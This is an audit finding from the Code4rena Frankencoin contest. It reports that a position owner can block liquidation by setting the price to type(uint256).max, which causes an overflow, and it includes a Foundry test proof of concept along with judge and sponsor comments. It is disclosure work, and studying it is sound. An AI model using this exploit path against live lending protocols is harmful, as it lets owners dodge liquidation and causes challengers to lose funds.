---
tags:
  - lang/solidity
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - novelty/known-pattern
protocol: "[[Frankencoin]]"
auditors:
  - "[[JGcarv]]"
report: "https://code4rena.com/reports/2023-04-frankencoin"
genome:
  - "[[underflow]]"
  - "[[direct-drain]]"
  - "[[known-pattern]]"
  - "[[integer-bounds]]"
  - "[[liquidation-underwater]]"
---
# [H-05] Position owners can deny liquidations

- id: 20020
- impact: HIGH
- protocol: [[Frankencoin]]
- reporter: JGcarv (Code4rena)
- source: https://code4rena.com/reports/2023-04-frankencoin

## Summary


A bug report has been identified in the code of the Frankencoin project, which is a decentralized cryptocurrency platform. The owner of a vulnerable position can deny being liquidated by setting the price to be `type(uint256).max`, making every call to `tryAvertChallenge` fail due to an overflow. This could result in the owner keeping the currency and leaving the collateral stuck, which could be advantageous if the collateral is likely to lose its value. A test proof was provided to demonstrate the bug, which was confirmed by two members of the project. The impact is the same as another issue (#670), but this has a different exploit path.

## Details


### Lines of code

<https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159> <br><https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L307>

### Impact

The owner of a vulnerable position can deny being liquidated by setting the price to be `type(uint256).max`, making every call to `tryAvertChallenge` fail due to an overflow.

This means that if it's advantageous enough the owner can choose to keep `zchf` and leave the collateral stuck. This could happen in any scenario where a collateral is likely to loose it's value, for example, de-pegs, runs on the bank, etc.

### Test Proof

Here's a snippet that can be pasted on `GeneralTest.t.sol`:

```solidity
    function test_liquidationDenial() public {
        test01Equity(); // ensure there is some equity to burn
        address posAddress = initPosition();
        Position pos = Position(posAddress);

        skip(15 * 86_400 + 60);

        alice.mint(address(pos), 1001);

        vm.prank(address(alice));
        pos.adjustPrice(type(uint256).max);

        col.mint(address(bob), 1001);
        uint256 first = bob.challenge(hub, posAddress, 1001);

        bob.obtainFrankencoins(swap, 55_000 ether);

        vm.expectRevert();
        bob.bid(hub, first, 10_000 ether); 

        skip(7 * 86_400 + 60);

        vm.expectRevert();
        hub.end(first, false);
    }
```

**[0xA5DF (lookout) commented](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1523244319):**
 > I think the real issue here is that you can't end the challenge (as shown in the last line of the PoC), that will cause a loss of funds for challenger and disincentivize users from challenging the position.

**[luziusmeisser (Frankencoin) confirmed and commented](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1532517706):**
 > Ouch, this is a good one.

**[hansfriese (judge) commented](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/481#issuecomment-1534102697):**
 > Great finding with coded POC. As the presort mentioned, the impact is the same as [`#670`](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/670), but this has a different exploit path. Satisfactory.



***
